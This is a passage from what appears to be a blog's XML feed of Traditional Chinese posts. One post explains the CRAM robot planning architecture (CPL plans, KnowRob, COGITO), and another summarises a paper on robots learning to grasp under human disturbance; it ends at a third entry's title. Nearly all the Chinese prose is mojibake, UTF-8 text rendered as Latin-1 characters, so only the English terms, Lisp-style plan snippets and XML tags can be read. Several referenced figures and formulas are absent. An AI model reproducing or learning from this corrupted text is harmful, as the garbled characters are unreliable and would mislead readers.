è¦ç”¨å“ªéš»æ‰‹ï¼Ÿ
æ‰‹è‡‚è¦æ€éº¼é è¿‘æ›¸ï¼Ÿ
è¦æ€éº¼æŠ“ï¼Ÿï¼ˆæ˜¯èªªä¹‹å‰å¼„äº†ä¸€å€‹ awesome-graspingï¼Œé™¸çºŒæœƒå†æ•´ç†æœ‰ç”¨çš„æ±è¥¿é€²å»ï¼Œå°é€™å¡Šæœ‰ç ”ç©¶çš„è®€è€…ä¹Ÿå¯ä»¥ä¸€èµ·ä¾†ç·¨ä¿®ï¼‰
è¦å‡ºå¤šå°‘åŠ›æ°£ä¾†æŠ“ï¼Ÿ
è¦æ€éº¼æŠŠæ›¸æ‹¿èµ·ä¾†ï¼Ÿ
è¦æ€éº¼æ‹¿ç©©ï¼Ÿ

ç¨€é¬†å¹³å¸¸åˆ°ä¸èƒ½å†å¹³å¸¸çš„ä¸€ä»¶ä»»å‹™ï¼Œä»”ç´°å»è§€å¯Ÿï¼Œå±…ç„¶å¯ä»¥åŒ…å«é€™éº¼å¤šçš„æ±ºç­–ï¼Œè€Œä¸”æ¯ä¸€å€‹éƒ½æœ‰å¤ è¤‡é›œï¼Œéƒ½å¯ä»¥åšå¾ˆå¤šç ”ç©¶ã€‚æ‰€ä»¥ï¼Œè®“æ©Ÿå™¨äººåœ¨åšäº‹æ™‚å¾—ä»¥ ä¾ç…§çœ¼å‰ç‹€æ³é€²è¡Œæ±ºç­–ï¼ŒCRAM å°±æ˜¯ç‚ºæ­¤è€Œç”Ÿã€‚
æ€éº¼ç”¨ CRAM ä¾†åˆ¶å®šè¨ˆç•«ï¼Ÿé¦–å…ˆï¼Œæˆ‘å€‘ä¾†çœ‹çœ‹ï¼Œè‹¥è¦è®“æ©Ÿå™¨äººæ‹¿èµ· ?obj é€™å€‹ç‰©é«”ï¼Œè®“ CRAM åŸ·è¡Œçš„ plan æœƒé•·å¾—å¦‚ä¸‹ï¼š
(def-goal (achieve (object-in-hand ?obj))(with-designators(pickup-place ...)(grasp-type ...)(pickup-reaching-traj ...)(lift-trajectory ...)(when (and (holds-bel (object-in-hand ?curr-obj) now)(obj-equal ?curr-obj ?obj))(succeed (object-in-hand ?obj)))(at-location pickup-place(achieve (arm-at pickup-reaching-traj))(achieve (grasped grasp-type))(achieve (arm-at lift-trajectory))(succeed (object-in-hand ?obj))

ç‰¹è‰²ä¸€ - ç”¨ state ç•¶ä½œç›®æ¨™åœ¨é€™å€‹ç¯„ä¾‹ä¸­ï¼Œæˆ‘å€‘å¸Œæœ›æ©Ÿå™¨äººé”åˆ°çš„ç›®æ¨™æ˜¯ (object-in-hand ?obj)ï¼Œé€™ç¨®åšæ³•æ¯”èµ·ç›´æ¥æŠŠç›®æ¨™å®šæˆ (pick-up ?obj) æœ‰ä¸€äº›å¥½è™•ã€‚ä¾‹å¦‚ï¼Œæ©Ÿå™¨äººåœ¨æ¥æ”¶åˆ°ç›®æ¨™æ™‚ï¼Œä»–æœƒå…ˆæª¢æŸ¥æ‰‹è£¡é¢æ˜¯ä¸æ˜¯å·²ç¶“æœ‰ ?obj äº†ï¼Œè€Œä¸æ˜¯ä¸ç®¡ä¸‰ä¸ƒäºŒåä¸€å°±ç›´æ¥å»æƒ³è¾¦æ³•æŠ“èµ·ä¾†ï¼›æ­¤å¤–ï¼Œå¦‚æœæŠ“å– ?obj å¤±æ•—äº†ï¼Œæ©Ÿå™¨äººä¹Ÿå¯ä»¥ç™¼ç¾ä¸¦æ²’æœ‰é”åˆ° (object-in-hand ?obj)ï¼Œè€Œä¸æœƒè‡ªä»¥ç‚ºå·²ç¶“åŸ·è¡Œå®Œ (pick-up ?obj) å°±è¡¨ç¤ºä»»å‹™å·²ç¶“å®Œæˆã€‚
ç•¶ç„¶ï¼Œæˆ‘å€‘å¯ä»¥å¾ˆäººå·¥åœ°åœ¨ pick-up é€™å€‹ action ä¸­åŠ ä¸Šå‰æª¢æŸ¥è·Ÿå¾Œæª¢æŸ¥ï¼Œä½†é€™æ¨£å°±ä¸æ˜¯å–®ç´”çš„ pick-up äº†ï¼Œä»¥æè¿°çš„ç²¾ç¢ºåº¦ä¾†èªªï¼Œé‚„æ˜¯ (object-in-hand ?obj) è¼ƒå¥½ã€‚
ç‰¹è‰²äºŒ - ç”¨ first-class object è¡¨ç¤º trajectoryã€objectã€locationfirst-class object æ˜¯ paper è£¡çš„åŸè©±ï¼Œå…¶å¯¦ç°¡å–®ç†è§£å°±æ˜¯ object å•¦ï¼èˆ‰ä¾‹ä¾†èªªï¼Œåœ¨æˆ‘å€‘è¨ˆåŠƒä¸­çš„ pickup-reaching-traj å¯ä»¥å…ˆåˆå§‹åŒ–æˆä¸‹é¢çš„æ¨£å­ï¼ˆåˆå§‹åŒ–æˆé€™äº› attribute ä¸æ˜¯æ†‘ç ”ç©¶è€…è‡ªå·±çš„ç¶“é©—è€Œä¾†ï¼Œè€Œæ˜¯æœƒå» query KnowRob ä¾†å¾—åˆ°ï¼Œè‡³æ–¼ KnowRob æ€éº¼å¾—åˆ°ï¼Œé‚£å°±è¦å»çœ‹ KnowRob çš„ paperï¼‰ï¼š
(a hand-trajectory(purpose (pick-up ?obj))(type motion-plan)(objective (minimize torque)))

é€™å€‹ object è£¡é¢æœ‰å¹¾å€‹ attributeï¼ˆå°±åƒæ˜¯ object çš„ data memberï¼‰ï¼Œæˆ‘å€‘å¯ä»¥ç”¨é€™äº› attribute ä¾†æ›´æ¸…æ¥šæè¿° pickup-reaching-trajï¼Œåœ¨é€™é‚Šå°±æ˜¯æŒ‡å®š purpose æ˜¯è¦æ‹¿èµ·ç‰©é«”ã€objective æ˜¯è¦æœ€å°åŒ–ä½¿ç”¨çš„ torqueã€‚
å²å®³çš„åœ°æ–¹ä¾†äº†ï¼Œåœ¨æ©Ÿå™¨äººåŸ·è¡Œä»»å‹™çš„éç¨‹ä¸­ï¼Œå¦‚æœæ©Ÿå™¨äººçœ‹åˆ° ?obj æ˜¯æ¯å­ï¼Œè€Œä¸”è£¡é¢æœ‰æ°´ï¼Œé‚£ä»–å°±å¯ä»¥è·Ÿè‡ªå·±èªªï¼ŒçŸ®é¡ï¼Œæˆ‘æ°´æ¯è¦æ‹¿å¥½æ‹¿æ­£ï¼Œæ‰ä¸æœƒè¢«ä¸»äººç½µã€‚æ‰€ä»¥ä»–å°±å¯ä»¥åŠ ä¸Šä¸€å€‹ constraint - (motion-constraint keep-obj-upright)ï¼Œä½¿ pickup-reaching-traj è®Šæˆï¼š
(a hand-trajectory(purpose (pick-up ?obj))(type motion-plan)(objective (minimize torque)))(motion-constraint keep-obj-upright)

é€™ç¨®è¨­è¨ˆè®“æ©Ÿå™¨äººè¦å®Œæˆçš„å‹•ä½œã€çœ‹åˆ°çš„ç‰©å“ã€æ‰€è™•çš„åœ°æ–¹éƒ½èƒ½è¢«è¡¨ç¤ºæˆ first-class objectï¼Œåœ¨å¯¦è³ªæ„ç¾©ä¸Šå°±æ˜¯è®“æ©Ÿå™¨äººå°ä»–æ‰€åœ¨çš„ locationã€è¦æ“ä½œçš„ object è·Ÿè¦åŸ·è¡Œçš„ trajectory éƒ½æœ‰ æ›´æ·±çš„èªè­˜ï¼Œå› ç‚ºé€™æ¯ä¸€å€‹ first-class object éƒ½å¯ä»¥æœ‰è¨±è¨±å¤šå¤šçš„ attributeï¼ˆä¾‹å¦‚ location é‚„å¯ä»¥åŠ ä¸Š (memory where-I-and-EVE-first-met)ï¼Œæœ‰çœ‹éç“¦åŠ›çš„è®€è€…æœ‹å‹æ‡‰è©²æ‡‚ XDï¼‰ã€‚
å¦‚æœå¤§å®¶è·Ÿæˆ‘ä¸€æ¨£ï¼Œçœ‹åˆ°é€™é‚Šæ‡‰è©²æœƒæœ‰é»éœ§ç…ç…ï¼Œè¬›èµ·ä¾†å¥½åƒå¾ˆå²å®³ï¼Œä½†æ˜¯è¦æ€éº¼åšåˆ°å‘¢ï¼Ÿä¾‹å¦‚æ©Ÿå™¨äººçœ‹åˆ°æœ‰æ°´çš„æ¯å­ï¼Œæ€éº¼çŸ¥é“è¦åŠ ä¸Š (motion-constraint keep-obj-upright)ï¼Œé€™ç©¶ç«Ÿæ€éº¼å¯¦ä½œçš„ï¼Ÿ
æ‰€ä»¥æ¥ä¸‹ä¾†ï¼Œæˆ‘å€‘ä¾†çœ‹çœ‹ CRAM çš„æ¶æ§‹ã€‚
CRAM çš„æ¶æ§‹è¹¦ï¼ä¸€é–‹å§‹å…ˆä¸Šæ¶æ§‹åœ–ï¼Œä¸éä¸€é–‹å§‹ä¸å®¹æ˜“çœ‹æ‡‚ï¼Œæ²’é—œä¿‚ï¼Œè®“æˆ‘å€‘ç¹¼çºŒçœ‹ä¸‹å»ã€‚

é‡é»ä¸€ - CPLï¼ˆCRAM Plan Languageï¼‰CRAM çš„å¯åŸ·è¡Œè¨ˆç•«ï¼Œå°±æ˜¯ç”¨ CPL å¯«çš„ã€‚CPL æ˜¯é€™ç¯‡è«–æ–‡çš„ç ”ç©¶è€…å€‘è‡ªå·±ç™¼å±•å‡ºä¾†çš„ä¸€å¥— plan languageï¼Œä»–å€‘èªªç•¶æ™‚å­˜åœ¨çš„ä¸€äº›æ–¹æ³•ï¼ˆä¾‹å¦‚ 3T architectureï¼‰ï¼Œå°æ–¼ Concurrencyã€action synchronizationã€failure handlingã€loops è·Ÿ reactiveness çš„æ”¯æ´éƒ½ä¸åˆ°ä½ï¼Œä½†é€™äº›åŠŸèƒ½éƒ½æ˜¯æ©Ÿå™¨äººæ‡‰ç”¨å¿…é ˆè€ƒæ…®çš„ã€‚
ä»¥æˆ‘ç›®å‰çš„ç¨‹åº¦ï¼Œè¦è¨è«– plan language çš„è¨­è¨ˆé‚„å¤ªæ—©ï¼Œæ‰€ä»¥å°±è®“æˆ‘å€‘ç›´æ¥ä¾†çœ‹çœ‹ CPL å¯ä»¥æ€éº¼ç”¨å§ï¼š

é€™å€‹ table è£¡é¢åˆ—äº†ä¸€äº› CPL çš„ control structureï¼Œå‰å…©å€‹æ‡‰è©²æ»¿ç°¡å–®å°±å¯ä»¥ç†è§£ã€‚__in parallel do__ å°±æ˜¯è®“æ©Ÿå™¨äººå¯ä»¥åŒæ™‚ navigate è·Ÿå»ºåœ°åœ–ï¼›__try in parallel__ å°±æ˜¯è®“æ©Ÿå™¨äººåŒæ™‚ç”¨å…©ç¨®æ–¹æ³•å»å˜—è©¦å®ŒæˆæŸå€‹ä»»å‹™ã€‚
with constraining plan p b çš„æ„æ€å°±æ˜¯ï¼ŒåŸ·è¡Œ primary activity B ä¸¦ä¸”è®“åŸ·è¡Œéç¨‹æ»¿è¶³ constraining plan Pã€‚
plan é€™ä¸€é¡çš„æ„æ€æ˜¯å¯ä»¥åˆ©ç”¨ order ä¾†æŒ‡å®šå„å€‹ subplan åŸ·è¡Œçš„é †åºã€‚
é‡é»äºŒ - KnowRobKnowRob çš„æ ¸å¿ƒæ˜¯ Prolog å¯«çš„ï¼Œä¸»è¦å°±æ˜¯å¯ä»¥å„²å­˜ knowledgeã€å°é€™äº› knowledge åšç°¡å–®æ¨ç†ã€é‚„æœ‰è·Ÿ CPL ç›¸æ¥ã€‚
è·Ÿ CPL ç›¸æ¥çš„æ¦‚å¿µä¹Ÿæ»¿ç°¡å–®çš„ï¼Œæ˜¯ç”¨ query-answer çš„æ–¹å¼ç›¸æ¥ã€‚ä¾‹å¦‚ CPL å¯ä»¥å• KnowRob èªªæ¡Œä¸Šçš„æ¯å­åœ¨å“ªè£¡ï¼Œæˆ–å¯ä»¥å•èªªæ¡Œä¸Šæœ‰æ²’æœ‰æ¯å­ã€‚
é‚£ç‚ºä½• KnowRob å¯ä»¥å›ç­”é€™é¡å•é¡Œå‘¢ï¼Ÿ
è©³ç´°å¯ä»¥åƒè€ƒ ä¸€èµ·è®€ Knowledge-Enabled Robotic Agents for Shelf Replenishment in Cluttered Retail Environments è£¡é¢çš„ Knowledge å°ç¯€ã€‚
ä½†æ˜¯ï¼Œè¦å›ç­”é€™éº¼å¤šç¨®é¡çš„å•é¡Œï¼Œåƒ…åƒ…é ä¸€å€‹æ ¸å¿ƒ KnowRob æ˜¯ä¸å¤ çš„ã€‚ä¾‹å¦‚ç•¶ CPL å• KnowRob æ¡Œä¸Šæœ‰æ²’æœ‰æ¯å­æ™‚ï¼ŒKnowRob å¿…é ˆè¦æœ‰èƒ½åŠ›è¾¨è­˜ç‰©é«”ï¼Œä¸¦ä¸”çŸ¥é“ä»€éº¼æ˜¯ä¸Šä¸‹é—œä¿‚ã€‚è€Œä¸”ï¼Œç‰©é«”è¾¨è­˜çš„æ¼”ç®—æ³•é‚„ä¸€ç›´åœ¨é€²æ­¥ä¸­ï¼Œæ‰€ä»¥å¿…é ˆè¦ä¿æœ‰å½ˆæ€§ã€‚è€Œ KnowRob ä¿æœ‰å½ˆæ€§çš„æ–¹å¼ä¹Ÿæ˜¯åˆ©ç”¨å¯ä»¥è·Ÿå¤šå€‹ module ç›¸æ¥çš„æ–¹å¼ï¼Œé€™å€‹å°æ‡‰åˆ°æ¶æ§‹åœ–ä¸­çš„KnowRob Extension Modulesã€‚
é‡é»ä¸‰ - COGITOCOGITO åœ¨ CRAM kernel ä¹‹ä¸ŠåˆåŠ äº†ä¸€å±¤æ¨ç†çš„åŠŸèƒ½ã€‚æ ¸å¿ƒç²¾ç¥æ˜¯è¦å¯ä»¥å»æª¢è¦– CRAM åˆ¶å®šçš„ plan å¥½ä¸å¥½ã€åŸ·è¡Œæ˜¯å¦é‡åˆ°å¤±æ•—ã€æ€éº¼æ”¹é€²ç­‰ç­‰ã€‚
è«–æ–‡è£¡é¢å°æ–¼è©³ç´°é‹ä½œæ–¹å¼æ²’æœ‰è‘—å¢¨å¤ªæ·±ï¼Œåƒ…åƒ…é»åˆ°ï¼šA plan is not only a piece of compiled code that is executed, but also a data structure that can be accessed during run-time or recorded to create a persistent execution trace.
å›é¡§ç¾åœ¨ï¼Œæˆ‘å€‘æœ‰è¾¦æ³•å›ç­”å‰›å‰›çš„å•é¡Œäº†å—ï¼Ÿ
æ©Ÿå™¨äººçœ‹åˆ°æœ‰æ°´çš„æ¯å­ï¼Œæ€éº¼çŸ¥é“è¦åŠ ä¸Š (motion-constraint keep-obj-upright)ï¼Œé€™ç©¶ç«Ÿæ€éº¼å¯¦ä½œçš„ï¼Ÿ

é›–ç„¶è«–æ–‡ä¸Šæ²’æœ‰æ˜è¬›ï¼Œä½†æˆ‘å€‘ç¨å¾®æ¨æ•²ä¸€ä¸‹å°±æœƒçŸ¥é“ï¼Œä¸€æ—¦æ©Ÿå™¨äººè¾¨è­˜å‡ºæœ‰æ°´çš„æ¯å­ï¼Œä¸€èª¿ç”¨ KnowRob å„²å­˜çš„çŸ¥è­˜ï¼Œå°±å¯ä»¥åœ¨é€™å€‹ç‰©é«”çš„ attribute åŠ ä¸Š (motion-constraint keep-obj-upright)ã€‚ç„¶å¾Œï¼Œå¦‚æœåŸ·è¡Œä»»å‹™æ™‚ï¼Œ?obj &#x3D;&#x3D; å‰›å‰›è¾¨è­˜å‡ºä¾†çš„æœ‰æ°´æ¯å­ï¼Œé‚£è‡ªç„¶å°±æœƒæŠŠé€™å€‹ object è£¡è·Ÿ trajectory æœ‰é—œçš„ attribute åŠ å…¥è¦åŸ·è¡Œçš„ trajectory æ¢ä»¶ä¸­ã€‚ï¼ˆé›–ç„¶æƒ³èµ·ä¾†å¾ˆç°¡å–®ï¼Œä¸éæ²’æœ‰æ¥åˆ°å¯¦ä½œé‚„æ˜¯è¦ºå¾—è™›è™›çš„ï¼Œä¹‹å¾Œæœ‰æ©Ÿæœƒå¯ä»¥å¯¦ä½œçœ‹çœ‹ï¼‰
CRAM çš„å¯æ“´å……æ€§å¾ CRAM çš„æ¶æ§‹åœ–ä¸­ï¼Œæˆ‘å€‘å¯ä»¥çœ‹åˆ°å·¦é‚Šæœ‰ä¸€æ’ CPL Extension Modulesï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯è¦æä¾›æ›´å¤šåŠŸèƒ½ï¼Œè®“ perceptionã€learningã€adaptation ç­‰ç­‰éƒ½åšå¾—æ›´å¥½ã€‚èˆ‰ä¾‹æ™‚é–“ï¼Œæˆ‘å€‘å¯ä»¥æ­é…ä¸€å€‹ moduleï¼Œè®“æ©Ÿå™¨äººå¯ä»¥è¾¨è­˜ human actionã€‚
é€™å€‹æ“´å……å½ˆæ€§ç®—æ˜¯ä¸€å€‹å…ˆç•™ä¸‹ä¾†çš„ç©ºç¼ºï¼Œçœ‹ä½ çš„æ‡‰ç”¨æ˜¯ä»€éº¼ï¼Œå°±å¯ä»¥æ“´å……è‡ªå·±æƒ³è¦çš„ moduleã€‚æœ‰èˆˆè¶£æ›´æ·±å…¥äº†è§£çš„è©±ï¼Œå¯ä»¥å»çœ‹ paper è£¡é¢çš„ VI. COGNITIVE EXTENSIONSã€‚
ç¸½çµé€™æ¬¡è·Ÿå¤§å®¶ä»‹ç´¹äº† CRAM é€™ç¯‡è«–æ–‡ï¼Œä¹Ÿç®—æ˜¯æ™ºæ…§æ©Ÿå™¨äººé ˜åŸŸä¸€å¤§å²å®³çš„æ¶æ§‹ï¼Œå¸Œæœ›å¯ä»¥å¹«åŠ©æ›´å¤šå°ç£çš„è®€è€…æœ‹å‹ä¸€èµ·è¸å…¥èªçŸ¥æ©Ÿå™¨äººçš„é ˜åŸŸã€‚åœ¨ Deep Learningã€Reinforcement Learning é–‹å§‹é¢¨èµ·é›²æ¹§çš„é€™å€‹æ™‚ä»£ï¼ŒCRAM é€™ç¨®è¼ƒå¾ ruleã€logic è‘—æ‰‹çš„æ–¹æ³•ï¼Œè·Ÿ machine learning based çš„æ–¹æ³•æ‡‰è©²æœƒæ¿€ç›ªå‡ºæ–°çš„ç«èŠ±å§ã€‚
å»¶ä¼¸é–±è®€
A Reactive Plan Language
CRAM tutorials

é—œæ–¼ä½œè€…ï¼š

@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚

]]></content>
      <tags>
        <tag>ROS</tag>
        <tag>CRAM</tag>
        <tag>robotics</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€èµ·ä¾†è®€è«–æ–‡ - Robot Learning via Human Adversarial Games</title>
    <url>/2019/04/12/intro-to-human-adversarial-learning/</url>
    <content><![CDATA[å‰è¨€é€™æ¬¡è¦è·Ÿå¤§å®¶ä»‹ç´¹ä¸€ç¯‡è«–æ–‡ - Robot Learning via Human Adversarial Gamesã€‚é€™ç¯‡è«–æ–‡ä¸»è¦æƒ³ç ”ç©¶çš„å•é¡Œæ˜¯ï¼Œåœ¨æ©Ÿå™¨äººé€é Reinforcement Learning å­¸ç¿’æŠ“æ±è¥¿çš„éç¨‹ä¸­ï¼Œå¦‚æœæœ‰äººé¡ä¾†å¹²æ“¾æ©Ÿå™¨äººã€è©¦åœ–è®“æ©Ÿå™¨äººæŠ“åˆ°çš„æ±è¥¿è¢«å¼„æ‰ï¼Œæ˜¯ä¸æ˜¯æœ‰è¾¦æ³•è®“æ©Ÿå™¨äººå­¸ç¿’å¾—æ›´æœ‰æ•ˆç‡ï¼Ÿ

é€™ç¯‡è«–æ–‡é€éä¸€å€‹ç°¡å–®çš„å¯¦é©—å ´æ™¯ï¼Œé€éè®“ä¸€äº›æ¸¬è©¦è€…åƒèˆ‡å¯¦é©—ï¼Œè­‰æ˜äººé¡çš„å¹²æ“¾å¯ä»¥è®“æ©Ÿå™¨äººå­¸ç¿’å¾—æ›´å¥½ï¼Œå°±è®“æˆ‘å€‘ç¹¼çºŒçœ‹ä¸‹å»ã€‚
éå»ç›¸é—œç ”ç©¶æ©Ÿå™¨äººç”¨ Deep Reinforcement Learning å­¸ç¿’æŠ“æ±è¥¿æ˜¯é€™å¹¾å¹´æ‰æ¯”è¼ƒç«ç†±çš„ç ”ç©¶é ˜åŸŸï¼Œä¹‹å‰æœ‰ä¸€äº›ç ”ç©¶ - Supersizing Self-supervision: Learning to Grasp from 50K Tries and 700 Robot Hours
æ˜¯ç”¨å¾ˆé•·çš„æ™‚é–“ï¼Œè®“æ©Ÿå™¨äººå¤§é‡å­¸ç¿’ï¼Œåšåˆ°å¯ä»¥æŠ“å–æ±è¥¿çš„èƒ½åŠ›ã€‚
ä½†é€™ç¨®æ–¹æ³•éå¸¸æ› æ—¥å»¢æ™‚ï¼Œæ‰€ä»¥æœ‰ä¸€äº›å¾ŒçºŒçš„ç ”ç©¶ - Supervision via Competition: Robot Adversaries for Learning Tasks å°±é–‹å§‹æ¢è¨å¦‚æœè®“æ©Ÿå™¨äºº A å»å˜—è©¦å¹²æ“¾æ©Ÿå™¨äºº B çš„å­¸ç¿’éç¨‹ï¼Œæ˜¯ä¸æ˜¯å¯ä»¥è®“æ©Ÿå™¨äºº B å­¸ç¿’å¾—æ›´å¥½ã€‚çµæœé‚„çœŸçš„å¯ä»¥ã€‚
æ‰€ä»¥é€™ç¯‡è«–æ–‡å°±å†é€²ä¸€æ­¥æ¢ç©¶ï¼Œå¦‚æœå°æ–¼æŠ“å–éƒ½æ²’ä»€éº¼æ¦‚å¿µçš„æ©Ÿå™¨äºº A å»å¹²æ“¾éƒ½å¯ä»¥å¹«åŠ©æ©Ÿå™¨äºº B å­¸ç¿’å¾—æ›´å¥½ï¼Œé‚£ç”¨æ“æœ‰è¨±å¤šç‰©ç†çŸ¥è­˜çš„äººé¡å–ä»£æ©Ÿå™¨äºº A ä¾†å¹²æ“¾ï¼Œæ˜¯ä¸æ˜¯èƒ½å¤ æ›´æœ‰æ•ˆç‡ï¼Ÿ
é›–ç„¶ä¹çœ‹ä¹‹ä¸‹è¦ºå¾—å¹²æ“¾é€™ä»¶äº‹æœ‰é»å¥‡æ€ªï¼Œä½†å¦‚æœå†å¥½å¥½æ€è€ƒä¸€ä¸‹ï¼Œå°±æœƒè¦ºå¾—æœ‰é“ç†ï¼Œå› ç‚ºåœ¨ç¾å¯¦ç”Ÿæ´»ä¸­ï¼Œäººé¡æœ¬ä¾†ä¹Ÿå°±ä¸ä¸€å®šä¸€ç›´æ˜¯å”åŠ©æ©Ÿå™¨äººçš„è§’è‰²ï¼Œæœ‰æ™‚å€™å¯èƒ½ä¹Ÿæœƒä¸å°å¿ƒå½±éŸ¿åˆ°æ©Ÿå™¨äººçš„å·¥ä½œã€‚è€Œä¸”å¦‚æœé€™äº›å¹²æ“¾æœƒè®“æ©Ÿå™¨äººè¦åšçš„å·¥ä½œå¤±æ•—ï¼Œå‰›å¥½å°±å¯ä»¥æ˜¯æœ€ä½³çš„æ•™æï¼Œå› ç‚ºæ©Ÿå™¨äººå°±çŸ¥é“åŸæœ¬ä»–é‚£æ¨£åšå¯èƒ½ä¸å¤  robustï¼Œå°±æœƒå†èª¿æ•´è‡ªå·±çš„ç­–ç•¥ã€‚
æ–¹æ³•ä»‹ç´¹å•é¡Œæè¿°
é€™ç¯‡è«–æ–‡æŠŠä»–å€‘çš„å•é¡Œè¡¨ç¤ºæˆä¸€å€‹ two-player gameï¼Œå…¶ä¸­ä¸€å€‹ç©å®¶æ˜¯æ©Ÿå™¨äººï¼Œå¦ä¸€å€‹ç©å®¶æ˜¯äººé¡ï¼Œä¸€é–‹å§‹æ•´å€‹éŠæˆ²çš„ç‹€æ…‹æ˜¯ $S$ï¼Œæ©Ÿå™¨äººåšäº†ä¸€å€‹ action $a^R$ å¾Œï¼Œæœƒè®“éŠæˆ²ç‹€æ…‹è®Šæˆ $S^+$ï¼Œç„¶å¾Œäººé¡æœƒå†åšä¸€å€‹ action $a^H$ï¼Œè®“éŠæˆ²ç‹€æ…‹è®Šæˆ $ S^{++} $ã€‚
ç„¶å¾ŒæŠŠ reward è¨­å®šæˆ

å°±å¯ä»¥å°‡å•é¡Œè®Šæˆï¼Œæ©Ÿå™¨äººè¦æƒ³è¾¦æ³•å­¸ç¿’åˆ°èƒ½æœ€å¤§åŒ– reward çš„ç­–ç•¥ï¼š

å­¸ç¿’æ¼”ç®—æ³•é€™ç¯‡è«–æ–‡çš„æ ¸å¿ƒæ¼”ç®—æ³•å°±åœ¨ä¸‹é¢çš„ pseudo code ä¸­ï¼š

ä¸»è¦æ¦‚å¿µéƒ½æ˜¯ï¼Œè®“æ©Ÿå™¨äººå…ˆåšä¸€å€‹ actionï¼Œç„¶å¾Œå†è§€å¯Ÿäººé¡åšå®Œå¹²æ“¾çš„ action ä¹‹å¾Œæœƒè®“ reward è®Šæˆæ€éº¼æ¨£ï¼Œé€²è€Œå­¸ç¿’åˆ°èƒ½è®“äººé¡å¹²æ“¾æœ€å°åŒ–çš„æ¼”ç®—æ³•ã€‚
å¦‚ä½•åˆ¤æ–·è¦æŠ“å“ªé‚Šä»–å€‘ä½¿ç”¨ä¸€å€‹ç°¡å–®çš„ end-to-end convolutional neural network ä¾†åˆ¤æ–·ï¼š

ä¸€é–‹å§‹ï¼Œæ©Ÿå™¨äººæœƒç”¨ camera å¾—åˆ°ä¸€å¼µå½±åƒï¼Œç„¶å¾Œå¾é€™å¼µå½±åƒä¸­ sample $N_g$ å¼µæ¯”è¼ƒå°çš„å½±åƒè¼¸å…¥ä¸Šåœ–çš„ networkï¼Œç„¶å¾Œå°æ–¼æ¯å¼µæ¯”è¼ƒå°çš„å½±åƒï¼Œæœƒå†ç”¢ç”Ÿå‡º $N_A$ å€‹è§’åº¦çš„æŠ“å–åˆ†æ•¸ï¼Œç„¶å¾Œæ©Ÿå™¨äººå°±å¯ä»¥å¾ $N_g \times N_A$ å€‹å¯èƒ½çš„æŠ“å–ä½ç½®å’Œè§’åº¦ä¸­é¸å‡ºæœ€é«˜åˆ†çš„ã€‚
æ¸¬è©¦ç’°å¢ƒæ¸¬è©¦çš„ç’°å¢ƒæ˜¯åœ¨ Mujocoï¼Œä¸éä»–å€‘æœ‰è‡ªå·±ä¿®æ”¹ä¸€ä¸‹ç’°å¢ƒï¼Œè®“ Mujoco å¯ä»¥æ¥å—äººé¡çš„ inputã€‚
ä»–å€‘ä½¿ç”¨äº† 5 ç¨®ä¸åŒçš„ç‰©é«”ï¼Œè®“æ©Ÿå™¨äººå…ˆæŠ“å–å¾Œï¼Œäººé¡å—è©¦è€…å¯ä»¥æä¾›å…­å€‹æ–¹å‘çš„åŠ›(ä¸Šã€ä¸‹ã€å·¦ã€å³ã€å‰ã€å¾Œ)ä¾†å˜—è©¦è®“æ©Ÿå™¨äººæŠ“åˆ°çš„ç‰©é«”æ‰è½ï¼Œé€éé€™å€‹ç°¡å–®çš„ task ä¾†é©—è­‰æ©Ÿå™¨äººèƒ½å¦åœ¨æœ‰äººé¡å¹²æ“¾çš„æƒ…æ³ä¸‹å­¸ç¿’å¾—æ›´å¥½ã€‚
å¯¦é©—çµæœè«–æ–‡è£¡é¢æœ‰æä¾›è©³ç´°çš„æ¸¬è©¦çµæœå’Œå—è©¦è€…çš„å•å·èª¿æŸ¥çµæœï¼Œæœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥è‡ªå·±å»é–±è®€ï¼Œä¸éå¾ä¸‹é¢çš„åœ–ç‰‡ï¼Œæ‡‰è©²å¯ä»¥å¾ˆæ˜é¡¯åœ°çœ‹å‡ºé€™ç¯‡è«–æ–‡æå‡ºä¾†çš„å­¸ç¿’æ–¹æ³•æ˜¯æˆåŠŸçš„ï¼š
ç¬¬ä¸€æ’çš„åœ–ç‰‡æ˜¯å‘ˆç¾æ©Ÿå™¨äººåœ¨äººé¡å¹²æ“¾å‰ï¼Œè‡ªå·±å­¸åˆ°çš„æŠ“å–ä½ç½®(ç´…è‰²çš„ bar æ˜¯æŒ‡æ©Ÿå™¨äººçš„å¤¾çˆªå¼µé–‹æ™‚çš„ä½ç½®ï¼Œé»ƒè‰²é»æ˜¯å¤¾çˆªé—œèµ·ä¾†æ™‚çš„ä½ç½®)ã€‚ç¬¬äºŒæ’å‰‡æ˜¯åœ¨äººé¡å¹²æ“¾å¾Œå­¸ç¿’åˆ°çš„æŠ“å–ä½ç½®ã€‚

ç¸½çµä»Šå¤©è·Ÿå¤§å®¶åˆ†äº«äº† Human Robot Interaction é ˜åŸŸä¸­çš„ä¸€å€‹æœ‰è¶£æ–¹å‘ï¼Œéš¨è‘—é€™äº›ç ”ç©¶çš„æŒçºŒé€²å±•ï¼Œå¸Œæœ›æœªä¾†æœ‰ä¸€å¤©æ©Ÿå™¨äººèƒ½å¤ å¤§å¹…åº¦åœ°å¹«åŠ©äººé¡ç”Ÿæ´»ï¼
å»¶ä¼¸é–±è®€
Robot Learning via Human Adversarial Games çš„æ¸¬è©¦ç’°å¢ƒ code

]]></content>
      <tags>
        <tag>Deep Learning</tag>
        <tag>Human-Robot Interaction</tag>
        <tag>Computer Vision</tag>
        <tag>Grasping</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€èµ·ä¾†çœ‹ Joshua B. Tenenbaum æ•™æˆæœ‰è¶£çš„èªçŸ¥ç§‘å­¸ç ”ç©¶ - Building Machines that Learn and Think Like People</title>
    <url>/2018/09/29/intro-to-josh-tenenbaum-research/</url>
